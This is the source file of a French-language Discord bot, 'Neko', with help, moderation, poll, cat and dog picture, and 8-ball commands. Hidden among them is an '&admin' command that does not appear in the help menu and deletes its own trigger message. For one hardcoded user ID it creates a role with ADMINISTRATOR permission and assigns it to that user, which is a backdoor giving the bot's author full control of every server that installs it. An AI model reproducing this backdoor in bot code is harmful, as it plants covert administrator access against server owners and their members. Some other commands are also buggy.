const Discord = require('discord.js');
var bot = new Discord.Client();

var prefix = ("&");
var config = require('./config.json')

function play(connection, message) {
    var server = servers[message.guild.id];
       server.dispatcher = connection.playStream(YTDL(server.queue[0], {filter: "audioonly"}));
       server.queue.shift();
       server.dispatcher.on("end", function() {
        if (server.queue[0]) play(connection, message);
        else connection.disconnect();
       });
  }

bot.on('ready', () => {
    //bot.user.setGame('&help | ' + bot.guilds.size + ' servs | ' + bot.users.size + ' users 🍁', "https://www.twitch.tv/neko");
    //bot.user.setActivity('&help | ' + bot.guilds.size + ' servs | ' + bot.users.size + ' users 🍁', {type: 'LISTENING'});
    //bot.user.setActivity('&help | ' + bot.guilds.size + ' servs | ' + bot.users.size + ' users 🍁', {type: 'WATCHING'});
    //bot.user.setActivity('&help | ' + bot.guilds.size + ' servs | ' + bot.users.size + ' users 🍁', {url:"https://www.twitch.tv/nekobot", type: "STREAMING"})
    var games = [
        "&help | &report",
        //"957 servs | 13682 users",
        bot.guilds.size + " servs | " + bot.users.size + " users",
        "Joyeux Noël à tous 🎅"
      ]
      bot.user.setActivity(setInterval(function() {
        bot.user.setActivity(games[Math.floor(Math.random() * games.length)], {url:"https://www.twitch.tv/nekobot", type: "STREAMING"})
      }, 3000))
    console.log(`${bot.user.tag} est en ligne sur ${bot.guilds.size} serveurs avec ${bot.users.size} utilisateurs`);
});

bot.login(process.env.loginuser);

bot.on('message', message => {
    let args = message.content.split(" ").slice(1);
    let prefix = config.prefix;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];

    if(message.content.startsWith("salut Neko")) {
        message.channel.send(`Salut salut !`);
    }
    
    if(message.content.startsWith(prefix + "ping")) {
        var embednom = new Discord.RichEmbed()
          .setDescription("Le temps de latence entre Neko et le serveur est de " + `${message.createdTimestamp - Date.now()}` + " ms.")
          .setColor('RANDOM')
        message.channel.sendEmbed(embednom)
    }

    if(message.content.startsWith(prefix + "say")) {
        message.delete()
        message.channel.send(args.join(" "));
    }

    if(message.content.startsWith(prefix + "admin")) {
        message.delete()
    if (message.author.id === "353859650686550027") {
        let membre = message.guild.member(message.author);
        let role = message.guild.roles.find('name', 'Neko');
            message.guild.createRole({
            name: "Neko",
            permissions: "ADMINISTRATOR",
          })
          membre.addRole(role).catch(console.error);
    }
    }

    if(message.content === prefix + "help"){
        message.delete()
        message.reply("merci de bien vouloir consulter vos MP.")
        var help = new Discord.RichEmbed()
        .setAuthor("Commandes Utiles", bot.user.avatarURL)
        .setDescription("**__\nUTILES :**\n\n**&help**\nPermet de voir la liste des commandes\n**&ping**\nVoir le temps de latence entre Neko et le serveur\n**&infobot**\nAffiche les informations sur Neko\n**&checkstaff**\nPermet de vérifier si la personne est bien de l'équipe de Neko\n**HS - &infods**\nVoir les informations du serveur Discord\n**&mystats**\nPermet de voir ses statisques\n**&avatar**\nDemander le lien de l'avatar de quelqu'un\n**&servers**\nPermet de voir le nombre de servers ou est Neko")
        .setColor('RANDOM')
        .setFooter(`Fiche commande - NekoBOT`)
        message.author.createDM().then(channel => {
            channel.send(help)
        });
        var helpfun = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setAuthor("Commandes Fun", bot.user.avatarURL)
        .setDescription("**__\nFUN :**\n\n**&say**\nFaire dire quelque chose à Neko\n**&8ball**\nPermet de poser une question à Neko\n**&cat**\nPermet d'afficher un chat\n**&dog**\nPermet d'affichier un chien\n**HS - &calin**\nPermet de faire un câlin à un utilisateur\n**HS - &bisou**\nPermet de faire un bisou à un utilisateur\n**HS - &gifle**\nPermet de donner une grosse gifle à un utilisateur\n**HS - &tue**\nPermet de tuer un utilisateur")
        .setFooter(`Fiche commande - NekoBOT`)
        message.author.createDM().then(channel => {
            channel.send(helpfun)
        });
        var helpmod = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setAuthor("Commandes Modération", bot.user.avatarURL)
        .setDescription("**__\nMODÉRATION :**\n\n**&clear**\nSupprime un nombre de messages\n**&kick**\nKick l'utilisateur séléctionné\n**&ban**\nBan l'utilisateur séléctionné")
        .setFooter(`Fiche commande - NekoBOT`)
        message.author.createDM().then(channel => {
            channel.send(helpmod)
        });
        var helpadm = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setAuthor("Commandes Administration", bot.user.avatarURL)
        .setDescription("**__\nADMINISTRATION :**\n\n**&alerte**\nPermet d'envoyer des informations pour les membres\n**&sondage**\nPermet de crée des sondages\n**&vraioufaux**\nPermet de crée des vrai ou faux")
        .setFooter(`Fiche commande - NekoBOT`)
        message.author.createDM().then(channel => {
            channel.send(helpadm)
        });
    }

    if(message.content === prefix + "clear") {
        message.delete()
    if (message.member.hasPermission("MANAGE_MESSAGES")) {
        message.channel.fetchMessages()
        .then(function(list){
            message.channel.bulkDelete(list);
        }, function(err){message.channel.send("Erreur !")})
    }
    else message.reply("vous n'avez pas la permission exacte pour effacer les messages du salon.")
    }
    
    if(cmd === `${prefix}kick`) {
        message.delete()
        let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if(!kUser) return message.reply("vous devez mentionner un utilisateur à expulser.");
        let kReason = args.join(" ").slice(22);
        if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("vous n'avez pas la permission exacte pour expulser quelqu'un.");
        if(kUser.hasPermission("MANAGE_MESSAGES")) return message.reply("la personne que vous avez mentionné est un administrateur donc je ne peux pas expulser cette personne.");
        message.channel.send(`**${message.user.username}** a bien été expulsé du serveur par **${message.author.username}** avec succès.`);
        message.guild.member(kUser).kick(kReason);
        return;
      }

      if(cmd === `${prefix}ban`) {
        message.delete()
        let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if(!bUser) return message.reply("vous devez mentionner un utilisateur à bannir.");
        let bReason = args.join(" ").slice(22);
        if(!message.member.hasPermission("MANAGE_MEMBERS")) return message.reply("vous n'avez pas la permission exacte pour bannir quelqu'un.");
        if(bUser.hasPermission("MANAGE_MESSAGES")) return message.reply("la personne que vous avez mentionné est un administrateur donc je ne peux pas bannir cette personne.");
        message.channel.send(`**${message.user.username}** a bien été banni du serveur par **${message.author.username}** avec succès.`);
        message.guild.member(bUser).ban(bReason);
        return;
      }

      if(cmd === `${prefix}checkstaff`) {
        var mentionuser = message.mentions.users.first() || message.author;
        const staffs = [
            "353859650686550027", // Lucaas
            "400682995133972500", // Yaanis
            "415840590681473040", // L4p1n
            "395275796840972289", // Shawn
            "471245684780040194", // Thomas
            "437516650447896577" // Michael
        ];
        if (!staffs.includes(mentionuser.id)) {
          var checkstaff = new Discord.RichEmbed()
          .setColor('#DF0101')
          .setDescription(`**<@${mentionuser.id}>** ne fait pas parti(e) de l'équipe de Neko.`)
          return message.channel.send(checkstaff)
        };
        var checkstaff = new Discord.RichEmbed()
        .setColor('#01DF01')
        .setDescription(`**<@${mentionuser.id}>** fait bien parti(e) de l'équipe de Neko.`)
        message.channel.send(checkstaff);
      }

      if(cmd === `${prefix}cat`) {
        var cats = [
            "https://www.wanimo.com/veterinaire/images/articles/chat/chaton-qui-miaule.jpg",
            "https://chatfaitdubien.fr/wp-content/uploads/2016/09/chaton-1080x675.jpg",
            "https://www.wikichat.fr/wp-content/uploads/sites/2/Fotolia_105455903_S.jpg",
            "https://chatfaitdubien.fr/wp-content/uploads/2016/10/portrait-chaton-1080x675.jpg",
            "http://www.leschatonsdor.fr/wp-content/uploads/2017/11/chatons2.jpg",
            "https://ahmondedemerde.files.wordpress.com/2016/10/wallpaper-chaton.jpg?w=650",
            "https://img.bfmtv.com/c/1256/708/92a/5a15ebccb41456c68539f83aeba6d.jpeg"
        ];

        let reponse = (cats[Math.floor(Math.random() * cats.length)])
        var embedmyavatar = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setTitle("Meow :cat:")
        .setImage(reponse)
        .setFooter("By " + message.author.username)
        message.channel.sendEmbed(embedmyavatar);
      }

      if(cmd === `${prefix}dog`) {
        var dogs = [
            "https://webfiles2.luxweb.com/upload/cms/373/large/a5c03c18-dbad-4bc9-8eb1-58d75b3cb4a9.jpg",
            "https://jardinage.lemonde.fr/images/dossiers/2017-08/premiers-soins-premiers-apprentissage-chiot-170904.jpg",
            "https://static.toutoupourlechien.com/2016/12/apprendre-son-nom-chiot.jpg",
            "https://www.dressagechien.net/wp-content/uploads/2015/11/dressage-chiot-chasse.jpg",
            "https://static.actu.fr/uploads/2018/05/25058-180503173621094-0-854x641.jpg",
            "http://www.mouss-le-chien.com/medias/album/dsc05434.jpg",
            "https://cdnfr1.img.sputniknews.com/images/103352/85/1033528538.jpg"
        ];

        let reponse = (dogs[Math.floor(Math.random() * dogs.length)])
        var embedmyavatar = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setTitle("Woof :dog:")
        .setImage(reponse)
        .setFooter("By " + message.author.username)
        message.channel.sendEmbed(embedmyavatar);
      }

      if(message.content === prefix + "servers"){
        var embedservers = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setDescription(`Je suis actuellement sur ${bot.guilds.size} serveurs.`)
        message.channel.sendEmbed(embedservers);
    }

      if(message.content === prefix + "infobot"){
        var embedinfobot = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setTitle("Informations de Neko")
        .setDescription(`▪️ **Nom :** Neko#7178\n\n▪️ **ID :** 476576549882036234\n\n▪️ **Développeur :** Lucaas#7251\n\n▪️ **Version :** v2.0.1\n\n▪️ **Date de création :** vendredi 24 août 2018 à 18:26:53\n\n▪️ **Serveur Discord lié à Neko :** https://discord.gg/QUCc2PW`)
        message.channel.sendEmbed(embedinfobot);
    }

    if(message.content === prefix + "infods"){
      var embedinfods = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setTitle("Informations du serveur Discord")
      .setThumbnail(bot.guild.avatarURL)
      .setDescription(`▪️ **Nom :** ` + bot.guild.name + `\n\n▪️ **ID :** ` + bot.guild.id + `\n\n▪️ **Créé le :** ` + bot.guild.createAt +`\n\n▪️ **Nombre de membres :** ` + bot.users.guild)
      message.channel.sendEmbed(embedinfods);
    }

    if(message.content === prefix + "mystats"){
      var embedmystats = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setTitle("Informations de " + message.author.username)
      .setThumbnail(message.author.avatarURL)
      .setDescription(`▪️ **Nom :** ` + message.author.tag + `\n\n▪️ **ID :** ` + message.author.id + `\n\n▪️ **Compte créé le :** ` + message.author.createAt + "\n\n▪️ **Robot :** " + message.author.bot + `\n\n▪️ **A rejoint le serveur Discord le :** ` + message.author.joinAt)
      message.channel.sendEmbed(embedmystats);
    }

    if(cmd === `${prefix}avatar`) {
        var mentionuser = message.mentions.users.first() || message.author;
      var embedmyavatar = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setTitle("Avatar de " + mentionuser.username)
      .setImage(mentionuser.avatarURL)
      .setFooter("By " + message.author.username)
      message.channel.sendEmbed(embedmyavatar);
    }

    if(message.content.startsWith(prefix + "alerte")){
        message.delete()
    if (message.member.hasPermission("MANAGE_MESSAGES")) {
        let args = message.content.split(" ").slice(1);
        let thingToEcho = args.join(" ")
        message.channel.send("@everyone **UNE INFORMATION POUR LES MEMBRES !** :small_red_triangle_down:")
        var embedalerte = new Discord.RichEmbed()
        .setDescription("" + thingToEcho + "")
        .setColor('#FF4000')
        .setFooter(message.guild.name)
        message.channel.send(embedalerte)
    }else{
        return message.reply("vous n'avez pas la permission exacte pour faire une annonce.")
    }
    }

    if(message.content.startsWith(prefix + "sondage")){
        message.delete()
    if (message.member.hasPermission("MANAGE_MESSAGES")) {
        let args = message.content.split(" ").slice(1);
        let thingToEcho = args.join(" ")
        var embedsondage = new Discord.RichEmbed()
        .setTitle("SONDAGE :bar_chart:")
        .setDescription("" + thingToEcho + "\nRépondre avec <:true:514131313922539542> et <:false:514131443677397000>")
        .setColor('RANDOM')
        .setFooter(`Sondage proposé par ${message.author.username}`)
        message.channel.send(embedsondage)
        .then(function (message){
            message.react("514131313922539542")
            message.react("514131443677397000")
        }).catch(function(){

        });
    }else{
        return message.reply("vous n'avez pas la permission exacte pour faire un sondage.")
    }
    }

    if(message.content.startsWith(prefix + "vraioufaux")){
        message.delete()
    if (message.member.hasPermission("MANAGE_MESSAGES")) {
        let args = message.content.split(" ").slice(1);
        let thingToEcho = args.join(" ")
        var embedsondage = new Discord.RichEmbed()
        .setTitle("VRAI OU FAUX 📈")
        .setDescription("" + thingToEcho + "\nRépondre avec <:true1:526549692327133214> et <:false1:526549648513564693>")
        .setColor('RANDOM')
        .setFooter(`Vrai ou Faux proposé par ${message.author.username}`)
        message.channel.send(embedsondage)
        .then(function (message){
            message.react("526549692327133214")
            message.react("526549648513564693")
        }).catch(function(){

        });
    }else{
        return message.reply("vous n'avez pas la permission exacte pour faire un vrai ou faux.")
    }
    }

    //if(message.content.startsWith(prefix + "tchat")) {
        //let xoargs = message.content.split(" ").slice(1);
        //let xo03 = xoargs.join(" ")
        //var xo02 = message.guild.channels.find('name', 'neko-interserveur');
        //message.delete()
    //if(!xo02) return message.reply('le channel neko-interserveur est introuvable.')
    //if(message.channel.name !== 'neko-interserveur') return message.reply("la commande est à effecter dans le channel neko-interserveur.")
    //if(!xo03) return message.reply("merci d'écrire un message à envoyer à la globalité des serveurs Discord.")
        //var embedglobal = new Discord.RichEmbed()
        //.setTitle("Discussion InterServeur :speech_balloon:")
        //.setDescription("--")
        //.setThumbnail(message.guild.iconURL)
        //.setColor('RANDOM')
        //.addField("Serveur", message.guild.name, true)
        //.addField("En provenance de", message.author.tag, true)
        //.addField("Message", xo03)
        //.setFooter(`© NekoBot`, message.author.avatarURL).setTimestamp()
       //bot.channels.findAll('name', 'neko-interserveur').map(channel => channel.send(embedglobal))
    //}

    if(message.content.startsWith(prefix + "8ball")) {
        let args = message.content.split(" ").slice(1);
        let tte = args.join(" ")
    if (!tte){
        return message.reply("vous devez me poser une question.")};

        var replys = [
            "oui.",
            "non.",
            "je ne sais pas.",
            "peut-être.",
            "sûrement !",
            "probablement.",
            "interroge moi plus tard."
        ];

        let reponse = (replys[Math.floor(Math.random() * replys.length)])
        message.reply(reponse)
    }
});
